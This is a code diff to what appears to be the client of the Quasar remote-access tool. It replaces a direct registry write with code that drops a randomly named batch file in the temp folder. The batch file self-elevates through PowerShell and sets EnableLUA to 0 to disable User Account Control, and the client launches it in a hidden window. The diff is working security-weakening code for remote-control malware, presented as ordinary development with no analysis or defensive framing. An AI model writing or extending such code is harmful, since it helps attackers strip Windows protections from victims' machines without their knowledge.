@@ -158,28 +158,75 @@ namespace Quasar.Client
 
                 new Thread(delegate ()
                 {
-                    foreach (RegistryView view in new RegistryView[]
-                    {
-                        RegistryView.Registry32,
-                        RegistryView.Registry64
-                    })
-                    {
+                    //foreach (RegistryView view in new RegistryView[]
+                    //{
+                    //    RegistryView.Registry32,
+                    //    RegistryView.Registry64
+                    //})
+                    //{
+                        //try
+                        //{
+                        //    using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, view))
+                        //    {
+                        //        RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true) ?? registryKey.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
+                        //        if (registryKey2 != null)
+                        //        {
+                        //            registryKey2.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
+                        //            registryKey2.Close();
+                        //        }
+                        //    }
+                        //}
+                        //catch (Exception)
+                        //{
+                        //}
+
+                        // Get the user's temp folder
+                        string tempFolder = Path.GetTempPath();
+                        if (string.IsNullOrEmpty(tempFolder))
+                        {
+                            MessageBox.Show("Failed to get temp folder path to disable UAC");
+                            return;
+                        }
+
+                        // Generate a random GUID for the batch file name
+                        string guid = Guid.NewGuid().ToString();
+                        string batchFileName = Path.Combine(tempFolder, $"{guid}.bat");
+
+                        // Batch script content
+                        string batchContent = @"
+                            @echo off
+                            :: Ensure the script runs as administrator
+                            if not ""%~1""=="""" goto :run
+                            powershell -Command ""Start-Process '%~f0' -ArgumentList ':run' -Verb RunAs""
+                            exit
+
+                            :run
+                            :: Disable User Account Control (UAC)
+                            reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
+                            ";
+
                         try
                         {
-                            using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, view))
+                            // Write the batch file to the temp folder
+                            File.WriteAllText(batchFileName, batchContent);
+
+                            // Execute the batch file
+                            ProcessStartInfo startInfo = new ProcessStartInfo
                             {
-                                RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true) ?? registryKey.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
-                                if (registryKey2 != null)
-                                {
-                                    registryKey2.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
-                                    registryKey2.Close();
-                                }
-                            }
+                                FileName = batchFileName,
+                                UseShellExecute = true,
+                                WindowStyle = ProcessWindowStyle.Hidden
+                            };
+
+                            Process.Start(startInfo);
+
+                            //Console.WriteLine($"Batch file created and executed: {batchFileName}");
                         }
-                        catch (Exception)
+                        catch (Exception ex)
                         {
+                            MessageBox.Show($"An error occurred: {ex.Message}");
                         }
-                    }
+                    //}
                     foreach (RegistryView view2 in new RegistryView[]
                     {
                         RegistryView.Registry32,
